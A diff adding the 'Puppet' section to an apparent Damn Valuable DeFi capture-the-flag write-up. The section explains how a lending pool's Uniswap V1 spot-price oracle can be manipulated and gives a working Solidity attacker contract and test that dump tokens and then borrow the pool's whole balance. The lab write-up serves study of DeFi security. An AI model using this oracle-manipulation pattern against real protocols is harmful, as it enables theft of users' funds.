@@ -11,6 +11,7 @@ In the explanations below, I assume that you are familiar with contracts.
 [5. The Rewarder](#5-the-rewarder)  
 [6. Selfie](#6-selfie)     
 [7. Compromised](#7-compromised)
+[8. Puppet](#8-puppet)
 
 ## 1. Unstoppable
 
@@ -543,4 +544,70 @@ Attack flow:
         payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
         vm.stopPrank();
 
+    }
+
+
+## 8. Puppet    
+
+### Challenge Overview  
+
+There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.  
+There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.   
+Pass the challenge by saving all tokens from the lending pool, then depositing them into the designated recovery account. You start with 25 ETH and 1000 DVTs in balance.   
+
+### Vulnerability Analysis
+
+The Puppet challenge presents a classic price oracle manipulation vulnerability in a DeFi lending protocol. The lending pool uses a Uniswap V1 exchange as its price oracle without any safeguards against manipulation.
+The core vulnerability lies in the price oracle implementation within the PuppetPool contract. The _computeOraclePrice() function directly calculates the DVT/ETH price based on the current balances in the Uniswap pool:
+
+    function _computeOraclePrice() private view returns (uint256) {
+        // calculates the price of the token in wei according to Uniswap pair
+        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+    }
+
+This implementation is highly vulnerable because it relies on a single liquidity source with extremely low liquidity and the price can be easily manipulated by changing the token balances in the pool.
+
+Attack flow:    
+
+1. Approve the Uniswap exchange to spend our DVT tokens 
+2. Sell a large amount of our DVT tokens to the Uniswap exchange    
+3. The price oracle now calculates a much lower price for DVT (because there's much more DVT in the pool)   
+4. Calculate the new, manipulated collateral requirement    
+5. Borrow all 100,000 DVT tokens from the lending pool using the minimal collateral requirement 
+6. Send the borrowed tokens directly to the recovery address    
+
+### Solution
+
+contract Attacker {
+
+    DamnValuableToken token;
+    PuppetPool pool;
+    IUniswapV1Exchange exchange;
+    address recovery;
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+    
+    constructor(DamnValuableToken _token, PuppetPool _pool, IUniswapV1Exchange _exchange, address _recovery) payable {
+        token = _token;
+        pool = _pool;
+        exchange = _exchange;
+        recovery = _recovery;
+    }
+
+    function startAttack() public {
+        token.approve(address(exchange), 1000e18);
+        exchange.tokenToEthSwapInput(1000e18, 1e18, block.timestamp + 1 days);
+        uint256 collateralRequired = pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        pool.borrow{value: collateralRequired}(POOL_INITIAL_TOKEN_BALANCE, recovery);
+    }
+
+    receive() external payable{}
+}
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_puppet() public checkSolvedByPlayer {
+        Attacker attacker = new Attacker{value: 25e18}(token, lendingPool, uniswapV1Exchange, recovery);
+        token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
+        attacker.startAttack();
     }
